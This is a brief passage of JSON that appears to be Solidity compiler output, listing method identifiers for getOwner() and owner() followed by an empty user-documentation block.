					"getOwner()": "893d20e8",
					"owner()": "8da5cb5b"
				}
			},
			"userdoc": {
				"methods": {}
			}
		}
	}
}